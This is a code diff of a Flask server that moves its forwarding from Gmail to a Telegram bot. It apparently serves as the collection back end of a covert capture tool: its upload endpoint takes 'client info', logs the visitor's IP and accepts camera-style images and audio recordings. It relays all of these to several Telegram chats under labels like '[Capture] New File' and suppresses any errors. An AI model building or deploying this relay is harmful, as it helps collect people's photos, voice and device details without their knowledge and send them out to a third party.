@@ -1,41 +1,51 @@
 import os
-import ssl
-import smtplib
 import tempfile
-import mimetypes
-from email.message import EmailMessage
+import requests
 from flask import Flask, request, jsonify, render_template
 
 app = Flask(__name__, template_folder="templates")
 
-GMAIL_USER = os.environ.get("GMAIL_USER")
-GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD")
-RECEIVE_TO = os.environ.get("RECEIVE_TO", GMAIL_USER)
+# ================= CONFIG =================
+BOT_TOKEN = os.environ.get("TG_BOT_TOKEN")
+# Comma-separated chat IDs, e.g. "123456789,-100987654321"
+CHAT_IDS = [cid.strip() for cid in os.environ.get("TG_CHAT_ID", "").split(",") if cid.strip()]
 SECRET_TOKEN = os.environ.get("SECRET_TOKEN")
 
+TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
 MAX_FILE = 12 * 1024 * 1024
-ALLOWED = {'jpg','jpeg','png','webm','mp3','m4a','wav','ogg'}
+ALLOWED = {"jpg", "jpeg", "png", "webm", "mp3", "m4a", "wav", "ogg"}
+# =========================================
 
-def send_email(subject, body, attachment_path=None, attachment_name=None):
-    msg = EmailMessage()
-    msg["From"] = GMAIL_USER
-    msg["To"] = RECEIVE_TO
-    msg["Subject"] = subject
-    msg.set_content(body)
 
-    if attachment_path:
-        mtype, _ = mimetypes.guess_type(attachment_name)
-        if not mtype:
-            mtype = "application/octet-stream"
-        maintype, subtype = mtype.split("/", 1)
-        with open(attachment_path, "rb") as f:
-            filedata = f.read()
-        msg.add_attachment(filedata, maintype=maintype, subtype=subtype, filename=attachment_name)
+def tg_send_text(text):
+    for chat_id in CHAT_IDS:
+        try:
+            requests.post(
+                f"{TG_API}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": text,
+                    "parse_mode": "Markdown"
+                },
+                timeout=20
+            )
+        except Exception:
+            pass
 
-    ctx = ssl.create_default_context()
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ctx) as server:
-        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
-        server.send_message(msg)
+
+def tg_send_file(file_path, filename):
+    for chat_id in CHAT_IDS:
+        try:
+            with open(file_path, "rb") as f:
+                requests.post(
+                    f"{TG_API}/sendDocument",
+                    data={"chat_id": chat_id},
+                    files={"document": (filename, f)},
+                    timeout=60
+                )
+        except Exception:
+            pass
 
 
 @app.route("/")
@@ -51,17 +61,19 @@ def upload():
 
     typ = request.form.get("type", "")
 
+    # -------- INFO --------
     if typ == "info":
         info = request.form.get("info", "")
         remote = request.remote_addr
-        subject = "[Capture Info] Client Connected"
-        body = f"Client Info:\n{info}\n\nServer Observed IP: {remote}"
-        try:
-            send_email(subject, body)
-            return jsonify({"ok": True}), 200
-        except Exception as e:
-            return jsonify({"ok": False, "err": str(e)}), 500
+        msg = (
+            "📡 *New Client Connected*\n\n"
+            f"{info}\n\n"
+            f"🌍 Server IP: `{remote}`"
+        )
+        tg_send_text(msg)
+        return jsonify({"ok": True}), 200
 
+    # -------- FILE --------
     if "file" not in request.files:
         return jsonify({"ok": False, "err": "no file"}), 400
 
@@ -83,17 +95,22 @@ def upload():
         tmp_name = tmp.name
         f.save(tmp_name)
 
-    subject = f"[Capture] New File: {fname}"
-    body = f"File received: {fname}\nSize: {size} bytes"
-
     try:
-        send_email(subject, body, tmp_name, fname)
+        tg_send_text(
+            f"📂 *New File*\n"
+            f"📄 Name: `{fname}`\n"
+            f"📦 Size: `{size}` bytes"
+        )
+        tg_send_file(tmp_name, fname)
     finally:
-        try: os.remove(tmp_name)
-        except: pass
+        try:
+            os.remove(tmp_name)
+        except Exception:
+            pass
 
     return jsonify({"ok": True}), 200
 
 
 if __name__ == "__main__":
-    app.run()
+    port = int(os.environ.get("PORT", 3000))
+    app.run(host="0.0.0.0", port=port)
